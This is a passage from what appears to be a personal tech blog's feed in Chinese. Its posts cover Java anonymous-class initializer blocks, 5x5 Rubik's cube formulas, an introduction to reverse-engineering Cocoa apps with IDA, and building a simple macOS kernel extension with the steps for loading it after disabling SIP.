<h3 id="测试案例"><a href="#测试案例" class="headerlink" title="测试案例"></a>测试案例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> java.util.*;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Anonymous</span> </span>&#123;</div><div class="line">    <span class="comment">// 代码块 1</span></div><div class="line">    &#123;</div><div class="line">        System.out.println(<span class="string">"代码块:"</span>+<span class="keyword">this</span>.getClass().getName());       <span class="comment">// 1】AnonymousDemo$1   //11】 aaa$1   //Anonymous</span></div><div class="line"></div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Anonymous</span><span class="params">()</span> </span>&#123;</div><div class="line">        System.out.println(<span class="string">"无参构造函数:"</span>+<span class="keyword">this</span>.getClass().getName());    <span class="comment">// 2】AnonymousDemo$1   // 12】aaa$1  //Anonymous</span></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">aaa</span></span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">aaa</span><span class="params">()</span> </span>&#123;</div><div class="line">        Anonymous n = <span class="keyword">new</span> Anonymous()&#123;</div><div class="line">            <span class="comment">// 代码块 4</span></div><div class="line">            &#123;</div><div class="line">                System.out.println(<span class="string">"Anonymous匿名类:"</span>+<span class="keyword">this</span>.getClass().getName());      <span class="comment">// 13】 aaa$1</span></div><div class="line">            &#125;</div><div class="line">        &#125;;</div><div class="line">        System.out.println(<span class="string">"n:"</span>+n.getClass().getName());        <span class="comment">//14】 aaa$1</span></div><div class="line">        List&lt;String&gt; list_1 = <span class="keyword">new</span> ArrayList&lt;String&gt;()&#123;</div><div class="line">            &#123;</div><div class="line">                System.out.println(<span class="string">"List匿名类:"</span>+<span class="keyword">this</span>.getClass().getName());       <span class="comment">//  15】aaa$2</span></div><div class="line">            &#125;</div><div class="line">        &#125;;</div><div class="line">        System.out.println(<span class="string">"list_1:"</span>+list_1.getClass().getName());      <span class="comment">// 16】 aaa$2</span></div><div class="line">        List&lt;String&gt; list_2 = <span class="keyword">new</span> ArrayList&lt;String&gt;();</div><div class="line">        System.out.println(<span class="string">"list_2:"</span>+list_2.getClass().getName());      <span class="comment">//  17】 java.util.ArrayList</span></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">bbb</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">bbb</span><span class="params">()</span> </span>&#123;</div><div class="line">        Anonymous n = <span class="keyword">new</span> Anonymous();</div><div class="line"></div><div class="line">        System.out.println(<span class="string">"n:"</span>+n.getClass().getName());        <span class="comment">// Anonymous</span></div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AnonymousDemo</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="comment">//@Test</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span> </span>&#123;</div><div class="line">        Anonymous n = <span class="keyword">new</span> Anonymous()&#123;</div><div class="line">            <span class="comment">// 代码块 2</span></div><div class="line">            &#123;</div><div class="line">                System.out.println(<span class="string">"Anonymous匿名类:"</span>+<span class="keyword">this</span>.getClass().getName());      <span class="comment">// 3】AnonymousDemo$1</span></div><div class="line">            &#125;</div><div class="line">        &#125;;</div><div class="line">        System.out.println(<span class="string">"n:"</span>+n.getClass().getName());        <span class="comment">//  4】AnonymousDemo$1</span></div><div class="line">        List&lt;String&gt; list_1 = <span class="keyword">new</span> ArrayList&lt;String&gt;()&#123;</div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</div><div class="line">                System.out.println(<span class="string">"size"</span>);     <span class="comment">// 7】</span></div><div class="line">                <span class="keyword">return</span> <span class="keyword">super</span>.size();            <span class="comment">//  8】</span></div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="comment">// 代码块3</span></div><div class="line">            &#123;</div><div class="line">                System.out.println(<span class="string">"List匿名类:"</span>+<span class="keyword">this</span>.getClass().getName());   <span class="comment">// 5】AnonymousDemo$2</span></div><div class="line">            &#125;</div><div class="line">        &#125;;</div><div class="line">        System.out.println(<span class="string">"list_1:"</span>+list_1.getClass().getName());      <span class="comment">// 6】AnonymousDemo$2</span></div><div class="line">        System.out.println(list_1.size());</div><div class="line"></div><div class="line">        List&lt;String&gt; list_2 = <span class="keyword">new</span> ArrayList&lt;String&gt;();</div><div class="line">        System.out.println(<span class="string">"list_2:"</span>+list_2.getClass().getName());      <span class="comment">// 9】java.util.ArrayList</span></div><div class="line">    &#125;</div><div class="line">    <span class="comment">//@Test</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span></span>&#123;</div><div class="line">        System.out.println(<span class="string">"--------------------"</span>);     <span class="comment">//10 】</span></div><div class="line">        aaa a = <span class="keyword">new</span> aaa();</div><div class="line">    &#125;</div><div class="line">    <span class="comment">// @Test</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test3</span><span class="params">()</span></span>&#123;</div><div class="line">        System.out.println(<span class="string">"--------------------"</span>);</div><div class="line">        bbb b = <span class="keyword">new</span> bbb();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</div><div class="line">        test1();</div><div class="line">        test2();</div><div class="line">        test3();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><img src="/include/img/AnonymousDemo.png" alt="AnonymousDemo输出"></p>
<h4 id="代码块用法总结："><a href="#代码块用法总结：" class="headerlink" title="代码块用法总结："></a>代码块用法总结：</h4><p><strong>代码块写在那个类,就是那个类的匿名类;相当于匿名类继承原有类,并且覆盖方法。</strong></p>
<h4 id="执行数序："><a href="#执行数序：" class="headerlink" title="执行数序："></a>执行数序：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">父类的- 静态代码块 static &#123;&#125;</div><div class="line">    |- 普通代码块 &#123;&#125;</div><div class="line">        |- 构造函数</div><div class="line"></div><div class="line">子类(匿名类)- 静态代码块 static &#123;&#125;</div><div class="line">    |- 普通代码块 &#123;&#125;</div><div class="line">        |- 构造函数</div><div class="line"></div><div class="line">注意：一个 class 的静态代码块在 JVM 中只会调用一次。</div></pre></td></tr></table></figure>
<p>根据 代码中注释 1】,2】… 可以证明上面的调用顺序是正确的。</p>
<h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p><strong>代码块写在那个类,就是那个类的匿名类;相当于匿名类继承原有类,并且覆盖方法。</strong></p>
<p>分析下 4个代码块的写法</p>
<p>代码块1：给自定义 class Anonymous 添加代码块，会在构造函数之前被执行，并且每次创建Anonymous 对象都会执行。</p>
<p>代码块2：创建自定义 class Anonymous 对象时添加代码块，那就相当于 <strong>创建一个Anonymous class的匿名子类</strong>。所以在 匿名类、父类、以及所有的方法中显示的 ClassName 都是当前创建匿名类(AnonymousDemo)的子类(AnonymousDemo.$1); 可以结合 test3()对比。</p>
<p>代码块3：创建 <strong>系统 class ArrayList 对象时添加代码块，和代码块2的原理是一样的</strong>。这里也不会显示ArrayList的名字而是显示AnonymousDemo.$2;</p>
<p>代码块4： 和代码块2 完全一样</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;转载自：&lt;a href=&quot;https://my.oschina.net/nullObject/blog/181802?p=1&quot;&gt;https://my.oschina.net/nullObject/blog/181802?p=1&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;new ArrayList&amp;lt;String&amp;gt;()&amp;#123;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    add(&amp;quot;&amp;quot;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&amp;#125;;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;java 代码中出现这种写法，好奇add 函数是调用哪里的？&lt;br&gt;
    
    </summary>
    
      <category term="开发" scheme="http://yoursite.com/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="java" scheme="http://yoursite.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>五阶魔方</title>
    <link href="http://yoursite.com/2017/03/18/%E4%BA%94%E9%98%B6%E9%AD%94%E6%96%B9/"/>
    <id>http://yoursite.com/2017/03/18/五阶魔方/</id>
    <published>2017-03-18T07:21:26.000Z</published>
    <updated>2017-03-20T05:21:09.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>魔方算是数学类的玩具，玩到最后就变成了肌肉+手势的简单操作。<br>我目前还没达到肌肉记忆的水平，所以要写篇文章记录一下。</p>
<a id="more"></a>
<p>5阶魔方步骤：</p>
<ul>
<li>6个面</li>
<li>12条棱</li>
<li>8个角</li>
</ul>
<h3 id="6个面"><a href="#6个面" class="headerlink" title="6个面"></a>6个面</h3><ul>
<li>去让回</li>
<li>使用最后2个面，采用1-2的方法</li>
</ul>
<h3 id="12条棱"><a href="#12条棱" class="headerlink" title="12条棱"></a>12条棱</h3><p>最后的情况只有2个”2+1”,或者3个”2+1”；并且2个”2+1”会变成3个”2+1”</p>
<p>一、先介绍 2个”2+1” –&gt; 3个”2+1”：</p>
<pre><code>-   TR U2做5次
</code></pre><p><a href="http://www.rubik.com.cn/alg/?type=alg&amp;alg=(Rw_U2)5_x2_B-_Rw_U-_R2_U_Rw-_&amp;scheme=custom&amp;puzzle=5x5x5&amp;view=playback" target="_blank" rel="external">Flash 动画</a></p>
<p>二、3个”2+1”：</p>
<p><img src="/include/img/life/棱3.png" alt=""><br><a href="http://www.rubik.com.cn/alg/?type=alg&amp;alg=R_U_R-_F_R-_F-_R&amp;scheme=custom&amp;puzzle=5x5x5&amp;setup=Uw_L-_U_L_Uw-&amp;view=playback" target="_blank" rel="external">Flash 动画</a></p>
<h4 id="技巧1-翻棱公式"><a href="#技巧1-翻棱公式" class="headerlink" title="技巧1. 翻棱公式"></a>技巧1. 翻棱公式</h4><p>遇上下面这种情况就 用翻棱公式。<br><img src="/include/img/life/翻棱公式.png" alt="TR2 B2 U2 TL U2 TR&#39; U2 TR U2 F2 TR F2 TL&#39; B2 TR2"></p>
<p><a href="http://www.rubik.com.cn/alg1/?type=alg&amp;alg=Rw2_B2_U2_Lw_U2_Rw-_U2_Rw_U2_F2_Rw_F2_Lw-_%0AB2_Rw2&amp;scheme=custom&amp;puzzle=5x5x5&amp;view=playback" target="_blank" rel="external">Flash 动画</a></p>
<h3 id="8个角"><a href="#8个角" class="headerlink" title="8个角"></a>8个角</h3><p>。。。<br>最后推荐一个 初学者学习的网站： <a href="http://www.rubik.com.cn/professor.htm" target="_blank" rel="external">魔方小站</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;魔方算是数学类的玩具，玩到最后就变成了肌肉+手势的简单操作。&lt;br&gt;我目前还没达到肌肉记忆的水平，所以要写篇文章记录一下。&lt;/p&gt;
    
    </summary>
    
      <category term="生活" scheme="http://yoursite.com/categories/categories-life/"/>
    
    
      <category term="魔方" scheme="http://yoursite.com/tags/%E9%AD%94%E6%96%B9/"/>
    
  </entry>
  
  <entry>
    <title>逆向分析 cocoa App</title>
    <link href="http://yoursite.com/2017/03/16/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-cocoa-App/"/>
    <id>http://yoursite.com/2017/03/16/逆向分析-cocoa-App/</id>
    <published>2017-03-16T05:50:01.000Z</published>
    <updated>2017-03-20T05:35:38.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>Title:【技术分享】Cocoa应用逆向工程简介<br>Url: <a href="http://bobao.360.cn/learning/detail/3601.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3601.html</a></p>
<p>Core Skill:<br>逆向分析 Object-C APP基础。</p>
<ol>
<li>如何使用 IDA 逆向Object-C编译得到的 C 代码</li>
<li>Cocoa App 的代码入口点</li>
<li>分析界面<a id="more"></a>
</li>
</ol>
<p>FLARE团队将会介绍两款小工具</p>
<p>我们会解释Objective-C的Runtime特性如何使得代码分析在诸如IDA Pro工具中变得复杂</p>
<p>如何在一份Cocoa应用程序的代码中找到开始分析的入口点。</p>
<h3 id="Objective-C"><a href="#Objective-C" class="headerlink" title="Objective-C"></a>Objective-C</h3><p>在编译时，Objective-C编写的程序会被转化为C，<br>由于Objective-C的动态特性，method一般不是被直接调用的。而是通过一个发给对象的消息。一个method的名字称为一个selector，真正执行的函数被称为一个实现（implementation）。<br>在Objective-C应用中最常用的发送消息方式就是objc_msgSend函数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> __objc2_meth &#123;</div><div class="line">    SEL NAME;       <span class="comment">// selector</span></div><div class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* types;  <span class="comment">//type encoding</span></div><div class="line">    IMP  imp;       <span class="comment">//implementation</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>该结构的第一个值是指向method的selector。该值的cross-references中的一项将我们带到了可执行文件__objc_selrefs 节，这个节中你可以找到selector reference。跟随该selector reference的cross-references我们可以在代码中找到任何selector被使用的位置。该结构的第三个值指向selector的实现，就是我们想要分析的函数。剩下要做的就是利用这个数据生成cross-references。</p>
<p>静态分析 OC 对应的汇编<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">__text:0000287E ; 32:   v9 = objc_msgSend(&amp;OBJC_CLASS___AppDelegate, &quot;class&quot;);</div><div class="line">__text:0000287E                 MOV             R0, #(selRef_class - 0x2892)</div><div class="line">__text:00002886                 MOV             R2, #(classRef_AppDelegate - 0x2894)</div><div class="line">__text:0000288E                 ADD             R0, PC ; selRef_class</div><div class="line">__text:00002890                 ADD             R2, PC ; classRef_AppDelegate</div><div class="line">__text:00002892                 LDR             R1, [R0] ; &quot;class&quot;    //select</div><div class="line">__text:00002894                 LDR             R0, [R2] ;</div><div class="line">__text:00002896                 BLX             _objc_msgSend</div><div class="line">_OBJC_CLASS_$_AppDelegate</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">__objc_selrefs:000057B8                 AREA __objc_selrefs, DATA</div><div class="line">__objc_selrefs:000057B8                 ; ORG 0x57B8</div><div class="line">__objc_selrefs:000057B8 selRef_class    DCD sel_class           ; DATA XREF: start+26o</div><div class="line">__objc_selrefs:000057B8                                         ; start+36o ...</div><div class="line">__objc_selrefs:000057B8                                         ; &quot;class&quot;</div><div class="line">__objc_selrefs:000057BC selRef_alloc    DCD sel_alloc           ; DATA XREF: -[AppDelegate application:didFinishLaunchingWithOptions:]+1Eo</div><div class="line">__objc_selrefs:000057BC                                         ; -[AppDelegate application:didFinishLaunchingWithOptions:]+36o ...</div><div class="line">__objc_selrefs:000057BC                                         ; &quot;alloc&quot;</div><div class="line">__objc_selrefs:000057C0 selRef_mainScreen DCD sel_mainScreen    ; DATA XREF: -[AppDelegate application:didFinishLaunchingWithOptions:]+70o</div><div class="line">__objc_selrefs:000057C0                                         ; -[AppDel</div></pre></td></tr></table></figure>
<p>从<strong>text 段跟踪到了objc_selrefs段。发现 在</strong>objc_selrefs 段中，key-value 名称的对应关系是 selRef_xxx - sel_xxx。</p>
<p>我们在 __objc_const 段中查看 select列表, 只有部分 select 名称中包含 sel 前缀。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">__objc_const:00005098 _OBJC_INSTANCE_METHODS_NSObject __objc2_meth_list &lt;0xC, 0x13&gt;</div><div class="line">__objc_const:00005098                                         ; DATA XREF: __data:_OBJC_PROTOCOL_$_NSObjecto</div><div class="line">__objc_const:000050A0                 __objc2_meth &lt;aIsequal, aC12048, 0&gt; ; &quot;isEqual:&quot;</div><div class="line">__objc_const:000050AC                 __objc2_meth &lt;aHash, aI804, 0&gt; ; &quot;hash&quot;</div><div class="line">__objc_const:000050B8                 __objc2_meth &lt;aSuperclass, a804_0, 0&gt; ; &quot;superclass&quot;</div><div class="line">__objc_const:000050C4                 __objc2_meth &lt;sel_class, a804_0, 0&gt; ; &quot;class&quot;</div><div class="line">__objc_const:000050D0                 __objc2_meth &lt;aSelf, a804, 0&gt; ; &quot;self&quot;</div><div class="line">__objc_const:000050DC                 __objc2_meth &lt;aZone, a_nszone804, 0&gt; ; &quot;zone&quot;</div><div class="line">__objc_const:000050E8                 __objc2_meth &lt;aPerformselecto, a12048, 0&gt; ; &quot;performSelector:&quot;</div><div class="line">__objc_const:000050F4                 __objc2_meth &lt;aPerformselec_0, a1604812, 0&gt; ; &quot;performSelector:withObject:&quot;</div><div class="line">__objc_const:00005100                 __objc2_meth &lt;aPerformselec_1, a200481216_0, 0&gt; ; &quot;performSelector:withObject:withObject:&quot;</div><div class="line">__objc_const:0000510C                 __objc2_meth &lt;aIsproxy, aC804, 0&gt; ; &quot;isProxy&quot;</div><div class="line">__objc_const:00005118                 __objc2_meth &lt;aIskindofclass, aC12048_0, 0&gt; ; &quot;isKindOfClass:&quot;</div><div class="line">__objc_const:00005124                 __objc2_meth &lt;aIsmemberofclas, aC12048_0, 0&gt; ; &quot;isMemberOfClass:&quot;</div><div class="line">__objc_const:00005130                 __objc2_meth &lt;aConformstoprot, aC12048, 0&gt; ; &quot;conformsToProtocol:&quot;</div><div class="line">__objc_const:0000513C                 __objc2_meth &lt;sel_respondsToSelector_, aC12048_1, 0&gt; ; &quot;respondsToSelector:&quot;</div><div class="line">__objc_const:00005148                 __objc2_meth &lt;aRetain, a804, 0&gt; ; &quot;retain&quot;</div><div class="line">__objc_const:00005154                 __objc2_meth &lt;aRelease, aVv804, 0&gt; ; &quot;release&quot;</div><div class="line">__objc_const:00005160                 __objc2_meth &lt;aAutorelease, a804, 0&gt; ; &quot;autorelease&quot;</div><div class="line">__objc_const:0000516C                 __objc2_meth &lt;aRetaincount, aI804, 0&gt; ; &quot;retainCount&quot;</div><div class="line">__objc_const:00005178                 __objc2_meth &lt;aDescription, a804, 0&gt; ; &quot;description&quot;</div><div class="line">__objc_const:00005184 _OBJC_INSTANCE_METHODS_NSObject_1 __objc2_meth_list &lt;0xC, 1&gt;</div></pre></td></tr></table></figure></p>
<blockquote>
<p>额，看不懂 Mach-O的各种段的含义，需要 正向开发 和分析 Mach-O文件格式了。。。<br><img src="/include/img/rev-ios.png" alt="rev-ios"></p>
</blockquote>
<p>继续。。。</p>
<p><a href="https://github.com/fireeye/flare-ida" target="_blank" rel="external">objc2_xrefs_helper.py</a> 脚本针对可执行文件中的每一个定义的Objective-C method都会进行处理<br>这个工具有一个显著的缺点，如果几个类使用同一个名字来定义method，那么只会有一个selector在可执行文件中显示。现在，该工具会忽略这些不明确的selector。</p>
<h3 id="Cocoa应用－从哪里开始着手？"><a href="#Cocoa应用－从哪里开始着手？" class="headerlink" title="Cocoa应用－从哪里开始着手？"></a>Cocoa应用－从哪里开始着手？</h3><p>整体来说，NSApplicationMain执行三个重要步骤：构建NSApplication对象，加载主要的storyboard或nib文件，开始事件循环。NSApplication对象在程序运行时扮演重要的事件和通知协调者的角色。</p>
<p>NSApplication对象可以定位的一个重要的通知就是NSApplicationDidFinishLaunchingNotification。这个通知用来让程序员可以在合适的时候运行应用特殊的初始化代码。为了处理这个通知，应用程序需要指定根据NSApplicationDelegate协议来指定一个委托类。在这个协议中包含初始化代码的对应method就是applicationDidFinishLaunching.Xcode默认为你创建这个委托类，名叫AppDelegate。</p>
<p>那么最好的寻找大多数Cocoa应用的初始化代码的地方就是applicationDidFinishLaunching</p>
<h3 id="接口构建器（Interface-Builder）和Nib文件"><a href="#接口构建器（Interface-Builder）和Nib文件" class="headerlink" title="接口构建器（Interface Builder）和Nib文件"></a>接口构建器（Interface Builder）和Nib文件</h3><p>界面生成器<br><a href="https://github.com/i-o-s/macOS-tools" target="_blank" rel="external">nib_parse.py</a>使用ccl_bplist来解码和反序列化一个nib文件，打印出里面定义的连接关系列表。对于每个连接，它将会打印出连接的标签（一般是一个方法或者变量名字），源对象的类，目标对象的类。每一个对象都被NSKeyedArchiver编码，并分配一个唯一的数字标识符，该标识符输出在圆括号里面。对于某些GUI组件还会一起打印出文本信息，比如按键标签，文本信息输出在方括号中。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Title:【技术分享】Cocoa应用逆向工程简介&lt;br&gt;Url: &lt;a href=&quot;http://bobao.360.cn/learning/detail/3601.html&quot;&gt;http://bobao.360.cn/learning/detail/3601.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Core Skill:&lt;br&gt;逆向分析 Object-C APP基础。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;如何使用 IDA 逆向Object-C编译得到的 C 代码&lt;/li&gt;
&lt;li&gt;Cocoa App 的代码入口点&lt;/li&gt;
&lt;li&gt;分析界面
    
    </summary>
    
      <category term="逆向" scheme="http://yoursite.com/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="ios" scheme="http://yoursite.com/tags/ios/"/>
    
      <category term="public intelligence" scheme="http://yoursite.com/tags/public-intelligence/"/>
    
      <category term="cocoa app" scheme="http://yoursite.com/tags/cocoa-app/"/>
    
  </entry>
  
  <entry>
    <title>OSX FirstExtension 开发</title>
    <link href="http://yoursite.com/2017/03/16/OSX-FirstExtension-%E5%BC%80%E5%8F%91/"/>
    <id>http://yoursite.com/2017/03/16/OSX-FirstExtension-开发/</id>
    <published>2017-03-16T05:34:03.000Z</published>
    <updated>2017-03-20T16:34:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>第一个 OSX 上的 Kernel Extension demo</p>
<a id="more"></a>
<p>参考：<a href="http://www.jianshu.com/p/f76bdfbc6779" target="_blank" rel="external">iOS架构-内核开发</a></p>
<p>从10.11开始Apple 对Kext 的安装变得更为严格。<br>从kext安装历史来看，10.11 之前可以通过<br><code>sudo nvram kext-dev-mode=1 and reboot(重启电脑).</code><br>这种方式来加载 非开发者证书签名的 kext。</p>
<p>但是之后 只有2条路了（上面的方式相对 更不安全）：</p>
<ol>
<li>购买 Apple 开发者证书</li>
<li>完全关闭 SIP</li>
</ol>
<p>关闭 SIP的方法:</p>
<ol>
<li>重启电脑,重启过程中一直按着command + R 直到进入startup界面</li>
<li>打开Terminal输入csrutil disable</li>
<li>reboot</li>
</ol>
<h3 id="代码展示（项目创建就算了）"><a href="#代码展示（项目创建就算了）" class="headerlink" title="代码展示（项目创建就算了）"></a>代码展示（项目创建就算了）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mach/mach_types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libkern/libkern.h&gt;</span>  <span class="comment">//C++ 库函数</span></span></div><div class="line"></div><div class="line"><span class="keyword">kern_return_t</span> FirstExtension_start(<span class="keyword">kmod_info_t</span> * ki, <span class="keyword">void</span> *d);</div><div class="line"><span class="keyword">kern_return_t</span> FirstExtension_stop(<span class="keyword">kmod_info_t</span> *ki, <span class="keyword">void</span> *d);</div><div class="line"></div><div class="line"><span class="keyword">kern_return_t</span> FirstExtension_start(<span class="keyword">kmod_info_t</span> * ki, <span class="keyword">void</span> *d)</div><div class="line">&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"FirstExtension is start!!!"</span>);</div><div class="line">    <span class="keyword">return</span> KERN_SUCCESS;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">kern_return_t</span> FirstExtension_stop(<span class="keyword">kmod_info_t</span> *ki, <span class="keyword">void</span> *d)</div><div class="line">&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"FirstExtension goto  stop!!!"</span>);</div><div class="line">    <span class="keyword">return</span> KERN_SUCCESS;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="开发测试："><a href="#开发测试：" class="headerlink" title="开发测试："></a>开发测试：</h3><p>在 10.12 上开发，然后拿到 10.11 关闭 SIP 的机器上测试。</p>
<p>编译安装 kext流程：</p>
<ul>
<li>uname -r 查看系統內核版本, 设置libkern版本</li>
<li>sudo chown -R root:wheel HelloWorld.kext 更改權限</li>
<li>sudo kextload HelloWorld.kext 加載內核擴展</li>
<li>kextstat 查看當前內核擴展情況</li>
<li>sudo kextunload HelloWorld.kext 卸載內核擴展</li>
</ul>
<p>注意 kext 的 info.plist 中<code>OSBundleLibraries -&gt;com.apple.kpi.libkern</code> 对应的版本号 是测试机上的 libkern 的版本(uname -a)</p>
<p><img src="/include/img/kext/xcode.png" alt="xcode"></p>
<p>使用 kextutil 工具检测 kext 存在的bug<br><img src="/include/img/kext/mini.png" alt="mini"></p>
<p>果然是关闭了 SIP 就可以 安装 kext, 已经显示 ‘allowing invalid signature xxx’<br><img src="/include/img/kext/kextstat.png" alt="kextstat"></p>
